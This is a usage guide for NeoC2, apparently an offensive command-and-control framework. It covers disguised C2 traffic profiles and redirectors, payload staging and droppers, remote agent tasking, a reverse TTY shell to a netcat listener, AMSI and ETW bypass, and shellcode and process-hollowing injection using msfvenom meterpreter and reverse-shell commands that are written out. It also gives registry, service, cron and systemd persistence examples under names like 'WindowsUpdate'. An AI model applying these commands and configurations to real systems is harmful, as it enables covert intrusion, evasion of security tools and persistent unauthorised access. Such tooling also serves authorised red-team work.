# GENERAL USAGE GUIDE

## Table of Contents
- [Profile Management](#profile-management)
- [Listener Management](#listener-management)
- [Payload Generation](#payload-generation)
- [Payload Staging](#payload-staging)
- [Task Management](#task-management)
- [Agent Management](#agent-management)
- [Interactive Mode](#interactive-mode)
- [Modules and Post-Exploitation](#modules-and-post-exploitation)
- [Evasion Techniques](#evasion-techniques)
- [File Operations](#file-operations)
- [Task Chaining](#task-chaining-web-ui-only)
- [Process Injections](#process-injections)
- [Persistence](#persistence)
- [Event Monitoring](#event-monitoring)
- [Security Features](#security-features)
- [Troubleshooting](#troubleshooting)


## Profile Management

Profiles define communication characteristics for agents:

### Profile Structure

```json
{
  "name": "my_https_profile",
  "description": "Custom HTTPS communication profile",
  "config": {
    "endpoints": {
      "download": "/api/assets/main.js",
      "register": "/api/users/register",
      "results": "/api/users/{agent_id}/activity",
      "tasks": "/api/users/{agent_id}/profile",
      "interactive": "/api/users/{agent_id}/settings",
      "interactive_status": "/api/users/{agent_id}/status"
    },
    "headers": {
      "Accept": "application/json",
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    },
    "heartbeat_interval": 10,
    "http_get": {
      "headers": {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
      },
      "uri": "/api/v1/info"
    },
    "http_post": {
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
      },
      "uri": "/api/v1/submit"
    },
    "jitter": 0.2,
    "protocol": "https",
    "p2p_enabled": false,
    "p2p_port": 8888,
    "kill_date": "2027-12-31T23:59:59Z",
    "working_hours": {
      "start_hour": 0,
      "end_hour": 24,
      "timezone": "UTC",
      "days": [1, 2, 3, 4, 5, 6, 7]
    },
    "redirector": {
      "redirector_host": "0.0.0.0",
      "redirector_port": 80
    }
  }
}
```

#### Kill Date Configuration

- **Field**: `kill_date`
- **Format**: ISO 8601 format in UTC timezone (`YYYY-MM-DDTHH:MM:SSZ`)
- **Example**: `"2027-12-31T23:59:59Z"`
- **Default**: If not specified, defaults to `"2027-12-31T23:59:59Z"`
- **Behavior**: When the agent's system time exceeds this date/time, the agent will self-delete

#### Working Hours Configuration

- **Field**: `working_hours`
- **Structure**:
  - `start_hour`: Start of working hours (0-23 in 24-hour format)
  - `end_hour`: End of working hours (0-23 in 24-hour format)
  - `timezone`: Timezone for working hours (currently only UTC is properly handled in the agent)
  - `days`: Array of days when working hours apply (1=Monday, 2=Tuesday, 3=Wednesday, 4=Thursday, 5=Friday, 6=Saturday, 7=Sunday)

**Example**:
```json
"working_hours": {
  "start_hour": 9,      // 9 AM
  "end_hour": 17,       // 5 PM
  "timezone": "UTC",    // Timezone
  "days": [1, 2, 3, 4, 5]  // Monday to Friday
}
```

1. Both kill date and working hours are embedded into the agent binary during generation and are not dynamically updated from the server during runtime.
2. Changes to the profile after agent deployment will NOT affect already deployed agents.
3. The agent currently handles UTC properly, but other timezones are primarily handled as local time.
4. Days are numbered from 1-7 (Monday=1, Sunday=7), with Sunday represented as both 0 (Go's default) and 7 (in configuration).
5. Hours are specified in 24-hour format (0-23).

#### Redirector

1. Add redirector settings to your C2 profile under the redirector key:
```json
 "redirector": {
      "redirector_host": "0.0.0.0",
      "redirector_port": 80
    }

```

2. How it works:
Use the --redirector flag when generating payloads
- Without `--redirector`: Agent connects directly to C2 server
- With `--redirector`: Agent connects to the redirector host/port specified in the profile instead of the C2 server
- All other agent behavior remains the same

### Load Profile to DB

Load a config using the `profile` handler and base-command:

```bash
profile add <config path>
# Register profile routes 
listener create <listener_name> https <port> <ip> profile_name=<profile_name>
```

### List avaiable Profiles

List all available profiles in DB 

```bash
profile list
```

### Reload existing Profiles

- During framework initialization, the default profile is automatically written to profiles/default.json
- Operators can make any changes to this json config and apply the changes by reloading the profile with changes using:
```bash
profile reload <profile_path> <profile_name>
```
- The reload command can be used for any custom profile, and the default profile

## Listener Management

HTTP listeners run as separate processes from the main Flask application, acting as internal redirectors, forwarding traffic from agents to the main web interface. Listeners in NeoC2 are profile-driven: they use predefined communication profiles. 

### Listener Commands

```
listener create <name> <type> <port> [profile_name=<profile>]
listener list
listener start <name>
listener stop <name>
listener delete <name>
```

### Profile Integration

When creating a listener, you associate it with a communication profile:
```
listener create my_http_listener type=http port=443 profile_name=stealth_crawler
```


## Payload Generation

See Agents & Stager Guide (on the sidebar) for complete agent type breakdown and usage:

## Payload Staging

NeoC2 supports staging payloads directly through the `payload_upload` base-command of the remote client server, allowing operators to deploy binary executables like .exe, .dll, or other file types in addition to Python scripts.

### Capabilities
- **Multi-Format Support**: Upload EXE, DLL, PY, JS, VBS, BAT, PS1, and other binary/script files
- **Encryption**: XOR encryption using SECRET_KEY environment variable with Base64 encoding
- **Automatic Serving**: Uploaded payloads automatically available at `/api/assets/main.js`
- **Intelligent Execution**: Droppers automatically detect payload type and handle appropriately
- **Maximum Size**: Supports payloads up to 50MB
- **Overwrite Functionality**: New uploads replace previous payloads

#### Example Usage:
```
NeocC2 > payload_upload <options>
# Then deploy droppers 
NeoC2 > stager generate linux_binary host=<c2_host> port=<c2_port> protocol=https
```

## Task Management

NeoC2 implements a sophisticated task management system:

### Task Types

1. **Queued Tasks**: Standard command execution
2. **Interactive Tasks**: Real-time command execution
3. **Download Tasks**: File retrieval operations
4. **Upload Tasks**: File transfer to agents
5. **Module Tasks**: Specialized module execution

### Task Lifecycle

1. **Creation**: Task added to agent queue
2. **Assignment**: Agent retrieves task
3. **Execution**: Agent executes task
4. **Result Submission**: Agent sends results back
5. **Storage**: Results stored in database
6. **Notification**: Operator notified of completion

### Task Commands

```
task <agent_id>                     # Show pending tasks
addtask <agent_id> <command>  # Add task to agent queue
```

### Task Result 
- Shows all results from all agents `result list`
- Displays specific agent results `result <agent_id>`
- Shows specific task results with detailed information `result <task_id`

```
result list
result <agent_id>
result <agent_id> <task_id>
```

## Agent Management

### Agent Lifecycle

Agents in NeoC2 follow a complete lifecycle:
1. **Registration**: Agents connect and register with the C2
2. **Heartbeat**: Regular check-ins to maintain connection
3. **Tasking**: Receive and execute commands
4. **Results**: Send back execution output
5. **Interaction**: Real-time command execution
6. **Termination**: Removal from management

### Agent Commands

```
agent list                    # List all active agents
agent interact <agent_id>     # Enter interactive mode with agent
agent info <agent_id>         # Get detailed agent information
agent kill <agent_id>         # Remove agent from management
```

### Agent Status Indicators

- Active: Agent regularly checking in
- Inactive: Agent not checking in (but not removed)
- Removed: Agent explicitly killed/removed


## Interactive Mode

Task-based Interactive mode provides real-time command execution similar to a reverse shell. When activated:

1. Agent polling frequency increases from 30s to 1s
2. Commands execute immediately
3. Results return in real-time
4. Session maintained until 'exit' command

### Entering Interactive Mode

```
NeoC2 > agent interact <agent-id>
# Prompt changes to:
NeoC2 [INTERACTIVE] > 
```

### Interactive Commands

Any command typed in interactive mode executes directly on the agent:
```
NeoC2 [INTERACTIVE:abc123] > whoami
NeoC2 [INTERACTIVE:abc123] > pwd
NeoC2 [INTERACTIVE:abc123] > ls -la
NeoC2 [INTERACTIVE:abc123] > exit
```

#### Change Agent profile configured heartbeat at runtime:

```
NeoC2 [INTERACTIVE:abc123] > sleep 2
# Kill agent process
NeoC2 [INTERACTIVE:abc123] >  kill
```

### Interactive Mode Features

- **Real-time Execution**: 1-second polling for immediate response
- **Persistent Storage**: All results stored in database
- **Timeout Recovery**: Retrieve late results with result command
- **Cross-platform**: Works on Windows/Linux/macOS agents
- **Dual Interface**: Available in both CLI and Web interfaces

## TTY Shell

Start a netcat listener in another terminal and send the command below to the agent. This upgrades interaction with an agent from a task-based interactive mode to a complete TTY Shell
```
NeoC2 > tty_shell <ip> <port> # default port is 5000
```

## Modules and Post-Exploitation

NeoC2 includes a modular framework for post-exploitation activities. Using Python, Powershell or Bash. 

### Available Modules

```
modules list                  # List available modules
modules load <module_name>    # Load a specific module
modules info <module_name>    # Get module information
run <module_name> [options]   # Execute a module
```

### Module Categories

1. **Evasion**: Bypass security mechanisms
2. **Persistence**: Maintain access across reboots
3. **Reconnaissance**: Gather system information
4. **Lateral Movement**: Move to other systems

### Example Module Usage

```
# Load and run sleep obfuscation module

# Load and run persistence module
modules load persistence
run persistence agent_id=<id> method=registry payload_path=C:\payload.exe name=WindowsUpdate
```

## Evasion Techniques

NeoC2 implements multiple evasion techniques to bypass endpoint security:

### Built-in Evasion Methods

1. AMSI Bypass: Anti-Malware Scan Interface bypass
2. ETW Bypass: Event Tracing for Windows disablement
3. Sleep Obfuscation: Process hollowing and indirect syscalls
4. String Encryption: Runtime decryption of sensitive strings
5. Process Injection: Reflective loading into legitimate processes

### Evasion Commands
Ensure C2 is in interactive mode before running evasion modules
```
interact <agent_id>
evasion enable <technique>     # Enable specific evasion technique
evasion disable <technique>    # Disable specific evasion technique
evasion list                  # List available evasion techniques
```

## File Operations

NeoC2 provides enhanced file operations with automatic handling of encoded content.

### File Download 
- Files are automatically base64-encoded during transfer 
   `download <remote_path>` - queues download task for the agent
- CLI automatically detects and decodes base64 content for storage
- Files saved to loot directory with timestamps and sanitized names
- Download an agent executable or script from C2 Server to your local remote_client machine.

### File Upload 
- Local files are base64-encoded before transmission to agent
- `upload <remote_path> <base64_data>` - agent receives and decodes the file
- CLI Integration: Use the `upload` command to send files to agents

### Save 
- `save <task_id>` - Saves the complete result from given task id
- Files ae stored on the server logs directory.
- Download to your connected client machine using `download <path>`

**Example Usage**:
```
# Download a file from the agent
download <agent_id> <remote_file_path>

# Download a file from the C2 Server
download <file_path_on_c2>

# Upload a file to the agent
upload <agent_id> <local_file_path> <remote_file_path>

# Save a task result to c2 and download to local machine
save <task_id>
save 2
download logs/task_2_20251128_224240.txt
```

## Task Chaining

NeoC2 provides advanced task chaining capabilities, allowing operators to create sequential workflows of multiple modules that execute in a predetermined order on target agents.

### Task Chaining Features

1. **Sequential Execution**: Execute multiple modules in a specific order
2. **Conditional Logic**: Future module execution based on previous results
4. **Real-time Monitoring**: Track chain execution progress
5. **Error Handling**: Automatic chain stopping on module failure
6. **Persistent Storage**: Save and reuse task chains
7. **Async Execution**: Queue chains for later execution

### Using Task Chaining
   
1. **CLI Usage**:

  ```
   NeoC2 > taskchain <options>
   ```

2. **Create New Chain**:
   - Select target agent from dropdown
   - Choose modules to chain (in execution order)
   - Optionally name the chain for future reference
   - Choose to execute immediately or queue for later

3. **Chain Execution**:
   - Modules execute sequentially on the target agent
   - Each module waits for previous module completion
   - Results from one module can influence the next (future enhancement)
   - Chain status updates in real-time

#### Chain Creation
- **Agent Selection**: Choose from all registered agents
- **Module Selection**: Browse and select multiple modules
- **Execution Order**: Drag-and-drop to reorder modules
- **Chain Naming**: Assign descriptive names to chains
- **Immediate Execution**: Option to run chain immediately after creation

#### Chain Monitoring
- **Real-time Status**: Live updates on chain progress
- **Module-by-Module Tracking**: See which module is currently executing
- **Success/Failure Indicators**: Visual feedback for each module
- **Detailed Results**: View output from each executed module

#### Chain Management
- **Chain Library**: Save and organize frequently-used chains
- **Bulk Operations**: Execute multiple chains simultaneously
- **Chain Templates**: Create reusable chain templates
- **Export/Import**: Share chains between operators
- **Audit Trail**: Track chain creation and execution history

### Example Task Chains

1. **Reconnaissance Chain**:
   - System information gathering
   - Network configuration enumeration
   - User account discovery
   - Credential harvesting (if applicable)

2. **Evasion Chain**:
   - AMSI bypass activation
   - ETW disabling
   - Sleep obfuscation configuration
   - Process injection setup

3. **Persistence Chain**:
   - Registry key modification
   - Scheduled task creation
   - Service installation
   - File system persistence

## Process Injections

### PInject

In-memory shellcode injection 

#### Compatibility
- Go_agent 

#### Usage
1. Generate compatible shellcode using msfvenom
2. Use the module with a base64 encoded shellcode string
3. The agent will in-memory inject the shellcode into either notepad.exe or explorer.exe 

#### msfvenom Command Syntax
Generate shellcode with proper null byte avoidance and correct format:

```
# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=1337 -f raw -o shellcode.bin
# Then base64 encode it before sending to the module
base64 -w 0 shellcode.bin

pinject <shellcode> [agent_id=<agent_id>] # METHOD - 1
run pinject <shellcode> [agent_id=<agent_id>] # METHOD - 2
```

#### Notes
- If notepad.exe is not running on the target system, the agent will fallback on explorer.exe
- The shellcode must be in raw binary format (use `-f raw`)

#### Process Injection Flow
1. Find target process PID
2. Open process with appropriate permissions
3. Allocate memory in target process
4. Write shellcode to allocated memory
5. Change memory protection to executable
6. Create remote thread to execute shellcode
7. All operations performed in-memory without touching disk

#### Supported Payloads
- windows/x64/meterpreter/reverse_tcp
- windows/x64/shell_reverse_tcp
- windows/x64/exec
- Any custom raw shellcode


### PEInject

Inject a PE file using Process Hollowing

#### Compatibility
- Go_agent 

#### Usage
1. Generate compatible PE payload using msfvenom
2. Parse the `pe_file` path on the C2 server as a required argument of the peinject module
3. The agent will in-memory inject this into either svchost.exe or explorer.exe using Process Hollowing

#### msfvenom Command Syntax

```
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe

peinject <pe_file> [agent_id=<agent_id>] [pe_file=<payload_path>] # METHOD - 1
run peinject <pe_file> [agent_id=<agent_id>] [pe_file=<payload_path>] # METHOD - 2
```

#### Supported Payloads
- windows/x64/exec
- windows/x64/shell_reverse_tcp
- windows/x64/meterpreter/reverse_tcp
- windows/x64/exec

## Persistence

This is primarily a module that helps operators establishes persistence on systems using various techniques `modules info persistence`

#### Required Options:
- `agent_id`: ID of the agent to establish persistence on
- `method`: Persistence method (registry, startup, cron, launchd, systemd, or service)
- `payload_path`: Path to the payload/script to persist

#### Optional Options:
- `name`: Name for the persistence mechanism (default: "SystemUpdate")
- `interval`: Interval for scheduled tasks (minutes, only for cron/systemd) (default: "60")

#### Usage:

**Linux/macOS Cron Persistence:**
```
run persistence agent_id=abc123-4567-8901-2345-67890abcdef1 method=cron payload_path=/tmp/payload.sh
```

**Windows Registry Persistence:**
```
run persistence agent_id=abc123-4567-8901-2345-67890abcdef1 method=registry payload_path=C:\Users\Public\payload.exe
```

**Windows Startup Folder:**
```
run persistence agent_id=abc123-4567-8901-2345-67890abcdef1 method=startup payload_path=C:\Users\Public\payload.exe
```

**Windows Service:**
```
run persistence agent_id=abc123-4567-8901-2345-67890abcdef1 method=service payload_path=C:\Users\Public\payload.exe name=WindowsUpdater
```

**Linux Systemd Service:**
```
run persistence agent_id=abc123-4567-8901-2345-67890abcdef1 method=systemd payload_path=/opt/payload service_interval=30
```

**macOS LaunchAgent:**
```
run persistence agent_id=abc123-4567-8901-2345-67890abcdef1 method=launchd payload_path=/Applications/payload.sh
```


## Event Monitoring

All C2 operations are logged. This information can be retrieved using the event handler:

```
event 
event list
event search
event stats
```

## Security Features

### Password Security

- **Secure Hashing**: All passwords hashed using Werkzeug security functions
- **Strong Requirements**: Support for complex password policies
- **Default Credentials**: Stored as secure hashes, not plain text

### Access Control

NeoC2 implements role-based access control:

1. **Admin Role**: Full access to all framework features
2. **Operator Role**: Manage agents, execute modules, handle listeners
3. **Viewer Role**: Read-only access to monitoring and reports

### Session Security

- **Secure Sessions**: Proper session management with authentication
- **Session Timeout**: Automatic logout after inactivity
- **Audit Logging**: Track all user actions and system events

### Encrypted Comms

Robust encrypted communication between agents and the C2 server using Fernet's AES-128-CBC, ensuring that only legitimate agents can register and communicate with the server, while all task and result data is encrypted in transit.

## Troubleshooting

### Common Issues and Solutions

#### Agent Doesn't Register
- Check C2 server is running
- Verify firewall allows connections
- Check agent can reach server: `curl https://your-server:443/health`

#### Interactive Mode Times Out
- Increase timeout in `send_interactive_command`
- Check agent is still running
- Verify agent is polling (check agent output)

#### Commands Not Executing
- Check agent logs for errors
- Verify agent has permissions to execute command
- Try simple command first: `whoami`

#### Agent Shows as Inactive
- Check agent is still running
- Verify network connectivity
- Agent becomes inactive after 5 minutes of no check-ins

### Debugging Endpoints

```
curl ip:443/health
curl ip:443/api/debug/auto-discovery
curl ip:443/api/debug/endpoints
```

### Useful CLI Commands for Troubleshooting

```
status                        # Show framework status
result list                   # Check for task results
agent list                    # Verify agent status
```



</content>
